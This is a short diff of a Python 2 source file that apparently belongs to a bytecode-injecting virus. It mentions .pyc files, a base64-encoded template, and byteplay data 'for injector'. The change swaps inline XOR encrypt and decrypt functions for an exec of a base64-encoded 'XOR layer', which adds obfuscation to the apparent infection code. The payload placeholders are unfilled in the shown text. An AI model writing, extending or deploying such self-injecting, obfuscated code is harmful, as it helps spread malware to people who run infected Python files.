@@ -8,22 +8,13 @@ import glob
 from base64 import b64decode, b64encode
 import random
 
-
-def crypt(clear):
-    key = chr(random.randint(0, 255))
-    crypted = "".join(chr(ord(c) ^ ord(key)) for c in clear)
-
-    return key + crypted
+DECRYPT=None
+exec b64decode("__XOR_LAYER_PY__")
 
 
 if __file__.endswith('.pyc'):
     template = b64decode("__TEMPLATE_PY__")
-    template = template.replace("__DECRYPT_PLACEHOLDER__", """
-def decrypt(crypted):
-    key = crypted[0]
-
-    return "".join(chr(ord(c) ^ ord(key)) for c in crypted[1:])
-""")
+    template = template.replace("__DECRYPT_PLACEHOLDER__", DECRYPT)
 
     # ------------- GENERATING BYTEPLAY DATA (for injector) ---------------
     LOAD_CONST = None
